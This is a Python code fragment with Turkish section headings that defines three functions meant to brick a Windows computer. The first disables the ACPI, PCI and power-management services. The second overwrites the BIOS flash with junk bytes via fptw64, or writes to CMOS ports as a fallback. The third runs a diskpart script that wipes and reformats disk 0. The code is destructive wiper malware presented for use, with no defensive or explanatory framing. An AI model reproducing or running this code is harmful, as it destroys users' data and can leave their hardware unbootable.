# 1) ANAKART GÜÇ DEVRESİ
# ==========================================
def kill_motherboard_power():
    try:
        subprocess.run('sc config acpi start= disabled', shell=True, capture_output=True)
        subprocess.run('sc config intelpep start= disabled', shell=True, capture_output=True)
        subprocess.run('sc config pci start= disabled', shell=True, capture_output=True)
        subprocess.run('powercfg -setacvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 893dee8e-2bef-41e0-89c6-b55d0929964c 0', shell=True, capture_output=True)
        subprocess.run('powercfg -setactive SCHEME_CURRENT', shell=True, capture_output=True)
        return True
    except:
        return False

# ==========================================
# 2) BIOS SPI FLASH
# ==========================================
def kill_bios_spi():
    try:
        fpt_paths = ["C:\\fptw64.exe", "C:\\Windows\\System32\\fptw64.exe"]
        fpt_found = None
        for path in fpt_paths:
            if os.path.exists(path):
                fpt_found = path
                break
        if fpt_found:
            subprocess.run(f'{fpt_found} -bios -d C:\\Windows\\Temp\\bios_backup.bin', shell=True, capture_output=True)
            with open("C:\\Windows\\Temp\\corrupt.bin", "wb") as f:
                f.write(b'\xFF' * (1024 * 1024 * 16))
            subprocess.run(f'{fpt_found} -bios -f C:\\Windows\\Temp\\corrupt.bin', shell=True, capture_output=True)
            return True
        else:
            debug_script = "o 70 2F\no 71 2F\no 72 2F\no 73 2F\nq"
            with open("C:\\Windows\\Temp\\bios_debug.txt", "w") as f:
                f.write(debug_script)
            subprocess.run('debug < C:\\Windows\\Temp\\bios_debug.txt', shell=True, capture_output=True)
            os.remove("C:\\Windows\\Temp\\bios_debug.txt")
            return True
    except:
        return False

# ==========================================
# 3) SABİT DİSK FIRMWARE
# ==========================================
def kill_disk_firmware():
    try:
        subprocess.run('wmic diskdrive set status="Error"', shell=True, capture_output=True)
        subprocess.run('wmic diskdrive set model="CORRUPTED"', shell=True, capture_output=True)
        diskpart_script = """
        select disk 0
        clean
        convert mbr
        create partition primary size=100
        active
        format fs=ntfs quick
        assign letter=X
        exit
        """
        with open("C:\\Windows\\Temp\\disk_kill.txt", "w") as f:
            f.write(diskpart_script)
        subprocess.run('diskpart /s C:\\Windows\\Temp\\disk_kill.txt', shell=True, capture_output=True)
        os.remove("C:\\Windows\\Temp\\disk_kill.txt")
        return True
    except:
        return False

